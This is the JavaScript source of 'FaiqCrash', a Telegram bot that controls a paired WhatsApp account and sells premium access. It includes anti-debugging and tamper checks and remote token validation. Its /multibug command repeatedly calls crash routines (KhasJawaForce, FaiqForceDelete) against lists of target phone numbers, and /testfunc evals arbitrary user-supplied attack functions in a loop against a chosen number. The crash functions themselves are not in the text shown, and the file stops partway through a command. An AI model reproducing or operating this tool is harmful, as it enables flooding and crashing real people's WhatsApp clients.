const { Telegraf } = require('telegraf');
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const dns = require("dns").promises;
const { URL } = require("url");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
//============( CONST ) =======\\
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const thumbnailUrl = "https://j.top4top.io/m_36940dnzz1.mp4";
//============( SAFE SOCK ) =======\\
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
//============( SECURITY ) =======\\
const databaseUrl = `https://raw.githubusercontent.com/azzam1235/FaiqDb/refs/heads/main/Faiq.json`
function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.red(`â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
   FAIQ CRASH
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
`));
console.log(chalk.bold.yellow(`
â–¡ Owner: FaiqOffc
â–¡ Version: 140 Gen 80 
â–¡ Script: FaiqCrash
â–¡ Status: Connected`))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`
  Bypass detected!!
  Your bypass tools are very bad idiot.
  `))
        activateSecureMode();
        hardExit(1);
      }    

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.red(`
â €â €Bypass detected!!
  Your bypass tools are very bad idiot.
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);
//============( VALIDATE TOKEN ) =======\\
  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.red(`
  Your token not registed in database!!
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.red(`
  failed connect to server!!
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();
//============( FEATURE ) =======\\
const bot = new Telegraf(tokenBot);
let tokenValidated = false;

bot.use((ctx, next) => {
  if (secureMode) return;

  const text = (ctx.message && ctx.message.text) ? ctx.message.text.trim() : "";
  const cbData = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data.trim() : "";

  const isStartText = typeof text === "string" && text.toLowerCase().startsWith("/start");
  const isStartCallback = typeof cbData === "string" && cbData === "/start";

  if (!tokenValidated && !(isStartText || isStartCallback)) {
    if (ctx.callbackQuery) {
      try { ctx.answerCbQuery("ğŸ”’ Akses terkunci â€” validasi token lewat /start <token>"); } catch (e) {}
    }
    return ctx.reply("ğŸ”’ Akses terkunci. Ketik /start <token> untuk mengaktifkan bot.");
  }
  return next();
});
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}
//============( CONNECT ) =======\\
const startSesi = async () => {
console.clear();
  console.log(chalk.bold.red(`
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
   FAIQ CRASH
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
`));
console.log(chalk.bold.yellow(`
â–¡ Owner: FaiqOffc
â–¡ Version: 140 Gen 80 
â–¡ Script: FaiqCrash 
â–¡ Status: Connected`))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Evox',
        }),
    };
    
    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote>PROSES PAIRING
â˜ Number: ${lastPairingMessage.phoneNumber}
â˜ Pairing Code: ${lastPairingMessage.pairingCode}
â˜ Type: Connected</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`Sender Connected`))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();
//============( CHECK ) =======\\

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("ğŸª§ â˜‡ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`â³ â˜‡ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("âŒ â˜‡ Akses hanya untuk premium");
        return;
    }
    next();
};

//============( COMMAND FEATURE ) =======\\
bot.command("addsender", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("âŒ â˜‡ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("ğŸª§ â˜‡ Format: /addsender 62Ã—Ã—Ã—");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("âŒ â˜‡ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("âŒ â˜‡ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`âœ… â˜‡ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

      const code = await sock.requestPairingCode(phoneNumber, "FAIQRARA");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote>PROSES PAIRING
â˜ Number: ${phoneNumber}
â˜ Pairing Code: ${formattedCode}
â˜ Type: Not Connected</blockquote>`;

    const sentMsg = await ctx.replyWithVideo(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote>
PROSES PAIRING
â˜ Number: ${lastPairingMessage.phoneNumber}
â˜ Pairing Code: ${lastPairingMessage.pairingCode}
â˜ Type: Connected</blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("âŒ â˜‡ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("ğŸª§ â˜‡ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`âœ… â˜‡ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("âŒ â˜‡ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("âœ… â˜‡ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("ğŸª§ â˜‡ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("âŒ â˜‡ Gagal menghapus session");
  }
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("âŒ â˜‡ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("ğŸª§ â˜‡ Format: /addprem 12345678 30");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("ğŸª§ â˜‡ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`âœ… â˜‡ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("âŒ â˜‡ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("ğŸª§ â˜‡ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`âœ… â˜‡ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgroup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("âŒ â˜‡ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("ğŸª§ â˜‡ Format: /addgroup -12345678 30");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("ğŸª§ â˜‡ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`âœ… â˜‡ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgroup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("âŒ â˜‡ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("ğŸª§ â˜‡ Format: /delggroup -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`âœ… â˜‡ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`ğŸª§ â˜‡ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.command("iqc", checkPremium, async (ctx) => {
                const chatId = ctx.chat.id;
                const userId = ctx.from.id.toString();
                const args = ctx.message.text.split(" ");

               
                const fullText = ctx.message.text.replace(/^\/iqc\s+/i, "");
                const [input, batteryInput] = fullText.split(",").map(s => s?.trim());

                if (!input || !batteryInput) {  
                        return ctx.reply(  
                                "âŒ Incorrect format.\n\nExample:\n/iqc FaiqOffc,188",  
                                { parse_mode: "Markdown" }  
                        );  
                }  

                const battery = parseInt(batteryInput);
                if (isNaN(battery) || battery < 0 || battery > 100) {
                        return ctx.reply("âŒ Battery must be a number between 0â€“100.", { parse_mode: "Markdown" });
                }

                const hours = Math.floor(Math.random() * 24).toString().padStart(2, '0');  
                const minutes = Math.floor(Math.random() * 60).toString().padStart(2, '0');  
                const time = `${hours}:${minutes}`;  
                  
                const carriers = ["TELKOMSEL", "INDOSAT OOREDOO", "XL AXIATA", "SMARTFREN", "IM3 (THREE)", "BY.U"];  
                const carrier = carriers[Math.floor(Math.random() * carriers.length)];  
                const signalStrength = Math.floor(Math.random() * 4) + 1;  

                const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(input)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=${signalStrength}&emojiStyle=apple`;  

                try {  
                        await ctx.replyWithChatAction("upload_photo");  

                        const response = await axios.get(apiUrl, { responseType: "arraybuffer" });    
                        const buffer = Buffer.from(response.data, "binary");    

                        await ctx.replyWithPhoto(  
                                { source: buffer },  
                                {  
                                        caption: `-# *iPhone Quoted Generator*\n\nğŸ’¬ ${input}\nğŸ•’ ${time} | ğŸ”‹ ${battery}% | ğŸ“¡ ${carrier}`,  
                                        parse_mode: "Markdown",  
                                        reply_markup: {  
                                                inline_keyboard: [  
                                                        [{ text: "FaiqCrash", url: "https://t.me/aboutfaiq" }]  
                                                ]  
                                        }  
                                }  
                        );  
                } catch (err) {  
                        console.error(err.message);  
                        ctx.reply("âŒ Terjadi kesalahan saat memproses gambar.");  
                }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("â— Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("âŒ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`âœ… File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("âŒ Gagal tourl:", err.message);
    ctx.reply("âŒ Gagal mengupload file ke URL.");
  }
});

const OWNER_ID = [8309055537];

bot.command('testfunc', async (ctx) => {
    const isOwner = OWNER_ID.includes(ctx.from.id);
    if (!isOwner) return ctx.reply('[ #!. ] Only for owners');

    if (!ctx.message.reply_to_message)
        return ctx.reply(
            `[ $ ] Please reply to a message containing a *JavaScript function*\n\nExample:\nreply -> async function test(bot, target, ctx){...}\n/testfunc 628xxxx,1`,
            { parse_mode: 'Markdown' }
        );

    const q = ctx.message.text.split(' ').slice(1).join(' ');
    if (!q)
        return ctx.reply(
            `â‰ï¸ Missing format.\n\nExample:\n/testfunc 628xxxx,5`
        );

    let [rawTarget, rawLoop] = q.split(',');
    const number = (rawTarget || '').replace(/[^0-9]/g, '');

    if (!number) return ctx.reply('[ $ ] Invalid target number');

    const loop = Number(rawLoop) || 1;
    const target = number;

    const funcCode =
        ctx.message.reply_to_message.text ||
        ctx.message.reply_to_message.caption ||
        '';

    if (!funcCode.includes('function'))
        return ctx.reply('[ $ ] Replied message is not a function');

    let fn;
    try {
        fn = eval(`(${funcCode})`);
    } catch (e) {
        return ctx.reply(`[ $ ] Parse error:\n${e.message}`);
    }

    const context = {
        sendMessage: async (chatId, text, opts = {}) => {
            return bot.telegram.sendMessage(chatId, text, opts);
        }
    };

    await ctx.reply(
        `[ # ] *TESFUNC EXECUTION*\n\n$ Target : ${number}\n$ Loop   : ${loop}x`,
        { parse_mode: 'Markdown' }
    );

    for (let i = 0; i < loop; i++) {
        try {
            await fn(bot, target, context);
        } catch (e) {
            console.log('[TESFUNC ERROR]', e);
        }
    }

    ctx.reply('[ ! ] Done');
});

// ===== /cekfunc =====
bot.command("cekfunc", async (ctx) => {
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text) {
    return ctx.reply(
      "âŒ Cara pakai:\nReply kode JS lalu ketik:\n/cekfunc"
    );
  }

  const code = ctx.message.reply_to_message.text;

  // Bungkus biar async aman
  const wrappedCode = `
    (async () => {
      ${code}
    })();
  `;

  try {
    // SYNTAX CHECK ONLY
    new vm.Script(wrappedCode);

    // SUCCESS RESPONSE
    const successMsg = `
ğŸŸ¢ <b>SYNTAX CHECK: PASSED</b>

âœ… <b>Status:</b> Aman, tidak ditemukan error syntax
ğŸ§  <b>Parser:</b> Node.js V8 Engine
ğŸ“¦ <b>Mode:</b> Async Function Wrapper
ğŸ” <b>Execution:</b> Diblokir (Syntax-only)

ğŸ“Š <b>Analisis Singkat:</b>
â€¢ Struktur kode valid
â€¢ Kurung & scope seimbang
â€¢ Keyword JavaScript dikenali
â€¢ Siap dieksekusi tanpa crash syntax

ğŸš€ <b>Kesimpulan:</b>
Kode lu <i>clean</i>, <i>aman</i>, dan <i>lanjut ke tahap logic</i>.
Gagah Si Eta, developer ğŸ˜ğŸ”¥
    `;

    return ctx.reply(successMsg, { parse_mode: "HTML" });

  } catch (err) {
    // ERROR RESPONSE
    const errorMsg = `
ğŸ”´ <b>SYNTAX ERROR DETECTED</b>

âŒ <b>Status:</b> Gagal parse kode
ğŸ§  <b>Engine:</b> Node.js V8
ğŸ“ <b>Error Type:</b> ${err.name}

ğŸ§¾ <b>Detail Pesan:</b>
<pre>${err.message}</pre>

ğŸ› ï¸ <b>Kemungkinan Penyebab:</b>
â€¢ Kurung <code>() {} []</code> tidak seimbang
â€¢ Salah penempatan <code>async / await</code>
â€¢ Typo keyword JavaScript
â€¢ Karakter ilegal / tidak tertutup

ğŸ“Œ <b>Saran:</b>
Periksa baris terakhir yang kamu edit, biasanya error muncul dari sana.
Perbaiki dulu, lalu jalankan <code>/cekfunc</code> ulang.

ğŸ’€ <i>Fix it, then we talk again.</i>
    `;

    return ctx.reply(errorMsg, { parse_mode: "HTML" });
  }
});

bot.command("trackweb", async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1).join(" ");
  const replyId = ctx.message.message_id;

  if (!input) {
    return ctx.reply(
      "âš ï¸ *Masukan URL website*\n\nContoh:\n`/trackweb https://example.com`",
      { reply_to_message_id: replyId, parse_mode: "Markdown" }
    );
  }

  let url;
  try {
    url = input.startsWith("http") ? new URL(input) : new URL("https://" + input);
  } catch {
    return ctx.reply("âŒ URL tidak valid.", { reply_to_message_id: replyId });
  }

  const domain = url.hostname;

  try {
    const dnsResult = await dns.lookup(domain);
    const res = await axios.get(url.href, {
      timeout: 10000,
      validateStatus: () => true
    });

    const headers = res.headers;
    const server = headers["server"] || "Unknown";
    const powered = headers["x-powered-by"] || "-";
    const cloudflare = headers["cf-ray"] ? "Yes" : "No";

    const ssl = url.protocol === "https:" ? "Enabled" : "Disabled";

    const output = `
ğŸ” *WEB TRACK RESULT*

ğŸŒ *Domain*
${domain}

ğŸ“¡ *Network*
IP       : ${dnsResult.address}
Family   : IPv${dnsResult.family}

ğŸ–¥ *Server*
WebSrv   : ${server}
Powered  : ${powered}
CloudFlr : ${cloudflare}

ğŸ” *Security*
HTTPS    : ${ssl}
Status   : ${res.status}

ğŸ§© *Headers*
CSP      : ${headers["content-security-policy"] ? "Yes" : "No"}
HSTS     : ${headers["strict-transport-security"] ? "Yes" : "No"}
X-Frame  : ${headers["x-frame-options"] ? "Yes" : "No"}

âš ï¸ *Note*
â€¢ Data publik
â€¢ Aman & legal
`;

    ctx.reply(output, {
      reply_to_message_id: replyId,
      parse_mode: "Markdown"
    });

  } catch (e) {
    console.error(e);
    ctx.reply("âŒ Gagal analisis website.", { reply_to_message_id: replyId });
  }
});

bot.command("statuswebsite", async (ctx) => {
  const url = ctx.message.text.split(" ")[1];

  if (!url)
    return ctx.reply("âŒ Gunakan:\n/statuswebsite https://example.com");

  let target = url;
  if (!/^https?:\/\//i.test(target)) {
    target = "http://" + target;
  }

  const msg = await ctx.reply("ğŸ” Mengecek status website...");

  try {
    const start = Date.now();
    const res = await axios.get(target, {
      timeout: 8000,
      validateStatus: () => true
    });
    const ping = Date.now() - start;

    let statusText = "ğŸŸ¢ ONLINE";
    if (res.status >= 400) statusText = "ğŸŸ  ERROR RESPONSE";

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
`ğŸŒ *STATUS WEBSITE*

ğŸ”— URL: ${target}
ğŸ“¡ Status: ${statusText}
ğŸ“„ HTTP Code: ${res.status}
â± Response Time: ${ping} ms

âœ… Website masih bisa diakses JierğŸ˜­ğŸ—¿ğŸ˜Œ`,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
`ğŸŒ *STATUS WEBSITE*

ğŸ”— URL: ${target}
ğŸ”´ Status: DOWN WKWKWK
â± Timeout / No Response

âŒ Website tidak dapat diakses mampus`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.command("multibug", async (ctx) => {
    const text = ctx.message.text;
    const args = text.split(" ").slice(1).join(" ");

    if (!args) {
      return ctx.reply(
        "âŒ *Format salah*\n\n" +
        "ğŸ“Œ Contoh:\n" +
        "`/multibug 62xxx, 62xxxx, 62xxxxx`"
      );
    }

    const numbers = args
      .split(",")
      .map(v => v.replace(/[^0-9]/g, ""))
      .filter(v => v.length > 5);

    if (numbers.length === 0) {
      return ctx.reply("âŒ Tidak ada nomor valid yang bisa diproses.");
    }

    const targets = numbers.map(n => n + "@s.whatsapp.net");
    const totalTarget = targets.length;

    let progressMsg = await ctx.reply(
      "ğŸš€ *MULTI BUG STARTED*\n\n" +
      `ğŸ¯ Total Target : ${totalTarget}\n` +
      `â³ Status       : Initializing...\n` +
      `ğŸ“Š Progress     : 0%`
    );

    for (let index = 0; index < targets.length; index++) {
      const target = targets[index];
      const current = index + 1;
      const percent = Math.floor((current / totalTarget) * 100);

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        "âš¡ *MULTI BUG IN PROGRESS*\n\n" +
        `ğŸ¯ Target        : ${target.replace("@s.whatsapp.net", "")}\n` +
        `ğŸ“Œ Urutan        : ${current} / ${totalTarget}\n` +
        `ğŸ“Š Progress      : ${percent}%\n` +
        `ğŸ›  Step          : Preparing...`
      );

      const loopBug = 100;
      for (let i = 0; i < loopBug; i++) {
        await sleep(1000);
        await KhasJawaForce(sock, target);
        await KhasJawaForce2(sock, target);
        await FaiqForceDelete(target);
        await sleep(1000);

        console.log(`âš”ï¸ MULTI NUMBER BUG â†’ ${target} | Loop ${i + 1}/${maxLoop}`);
      }

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        "âš¡ *MULTI BUG IN PROGRESS*\n\n" +
        `ğŸ¯ Target        : ${target.replace("@s.whatsapp.net", "")}\n` +
        `ğŸ“Œ Urutan        : ${current} / ${totalTarget}\n` +
        `ğŸ“Š Progress      : ${percent}%\n` +
        `âœ… Status        : Target selesai`
      );

      await sleep(1500);
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      progressMsg.message_id,
      null,
      "âœ… *MULTI BUG COMPLETED*\n\n" +
      `ğŸ¯ Total Target : ${totalTarget}\n` +
      `ğŸ“Š Progress     : 100%\n` +
      `ğŸ”¥ Status       : All target processed`
  );
});

bot.command("cekid", async (ctx) => {
  if (!ctx.message) return;

  let target;

  // === REPLY TEXT SI ANJING ===
  if (ctx.message.reply_to_message) {
    target = ctx.message.reply_to_message.from;
  }

  // === PAKE USERBAME SI TOLOL @ ===
